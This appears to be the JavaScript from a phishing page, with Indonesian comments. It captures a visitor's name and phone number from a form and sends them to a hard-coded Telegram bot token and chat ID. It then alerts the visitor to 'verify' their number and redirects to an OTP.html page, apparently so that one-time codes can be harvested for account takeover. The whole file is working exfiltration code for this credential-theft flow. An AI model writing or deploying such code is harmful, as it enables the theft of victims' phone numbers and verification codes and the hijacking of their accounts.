
document.getElementById('contactForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const name = document.getElementById('name').value;
    const telegram= document.getElementById('telegram').value;
    
    const token = '7686748052:AAHQe5nOPpzY2pA6BKpYlKMaje6g4j9B92k'; // Ganti dengan token bot Anda
    const chatId = '7918927436'; // Ganti dengan ID chat Anda
    
    const text = `Nama: ${name}\nNomor: ${telegram}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('silahkan KLIK SELANJUTNYA untuk verifikasi Nomor anda');
                    document.getElementById('contactForm').reset(); // Reset formulir
                    window.location.href = "OTP.html"; // Arahkan ke halaman otp.html
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    // Panggil fungsi gabungan
    gabungkanFungsi();
});
